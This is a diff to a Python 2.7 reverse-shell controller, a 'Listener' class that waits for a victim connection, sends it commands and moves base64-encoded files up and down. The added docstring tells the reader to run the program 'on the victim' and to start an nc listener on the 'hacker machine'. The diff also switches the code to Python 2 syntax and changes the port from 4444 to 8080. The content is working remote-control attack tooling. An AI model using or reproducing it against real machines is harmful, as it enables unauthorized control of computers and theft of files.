@@ -1,3 +1,13 @@
+'''
+    COMPATIBLE VERSION:
+        python2.7
+    RUN THIS PROGRAM ON THE VICTIM
+    RUN THE FOLLOWING ON THE HACKER MACHINE, to listen on a port
+        nc -vv -l -p port_num
+        nc -vv -l -p 8080
+    NOTE:
+        The current ip is the kali ip
+'''
 #!/usr/bin/env python
 import socket, json, base64, os
 
@@ -14,9 +24,9 @@ class Listener:
         print("[+] Got a connection from " + str(address))
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        self.connection.send(json_data)
     def reliable_receive(self):
-        json_data = b""
+        json_data = ""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
@@ -38,7 +48,7 @@ class Listener:
             return base64.b64encode(file.read())
     def run(self):
         while True:
-            command = input(">> ")
+            command = raw_input(">> ")
             command = command.split(" ")
             try:
                 if command[0] == "upload":
@@ -53,6 +63,6 @@ class Listener:
                 result = "[-] Error during command execution."
             print(result)
 
-my_listener = Listener("192.168.8.128", 4444)
+my_listener = Listener("192.168.8.128", 8080)
 my_listener.run()
 
